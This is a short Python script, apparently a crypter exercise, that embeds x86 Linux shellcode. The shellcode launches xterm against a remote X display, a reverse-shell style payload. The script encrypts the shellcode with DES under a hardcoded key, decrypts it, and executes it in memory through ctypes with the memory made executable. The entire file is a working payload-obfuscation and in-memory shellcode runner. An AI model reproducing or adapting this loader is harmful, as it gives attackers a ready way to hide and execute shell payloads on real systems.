from ctypes import *
from Crypto.Cipher import DES
from Crypto import Random
iv = Random.get_random_bytes(8)
des1 = DES.new('12341234', DES.MODE_CFB, iv)
des2 = DES.new('12341234', DES.MODE_CFB, iv)
#Shellcode
shellcodeplacement = ""
shellcodeplacement += "\x31\xc0\x31\xd2\x31\xf6\x31\xc9\x50\x68\x31\x3a\x31\x30\x68\x31\x2e\x31\x2e\x68\x31\x32\x37\x2e\x89\xe6\x50\x68\x70\x6c\x61\x79\x68\x2d\x64\x69\x73\x89\xe7\x50\x68\x74\x65\x72\x6d\x68\x69\x6e\x2f\x78\x68\x73\x72\x2f\x62\x68\x2f\x2f\x2f\x75\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"

#printing the shellcode
def print_shellcode(shellcode):
        encoded = ""
        for x in bytearray(shellcode):
                value = x
                encoded += '\\x'
                encoded += '%02x' % value
        print (encoded)
#Encrypting the shellcode using the key 12341234 and random IV
encrypt_shellcode = des1.encrypt(shellcodeplacement)

#Encrypted Shellcode
print ("Encrypted shellcode is")
print_shellcode(encrypt_shellcode)
#Decrypting the shellcode using the same key
decrypt_shellcode = des2.decrypt(encrypt_shellcode)

#Decrypted Shellcode
print 'Decrypted shellcode is'
print_shellcode(decrypt_shellcode)
#executing shellcode
libc = CDLL('libc.so.6')
sc = c_char_p(decrypt_shellcode)
size = len(decrypt_shellcode)
shell = c_void_p(libc.valloc(size))
memmove(shell,sc,size)
libc.mprotect(shell,size,0x7)
print (len(decrypt_shellcode))
execute = cast(shell, CFUNCTYPE(c_void_p))
execute()
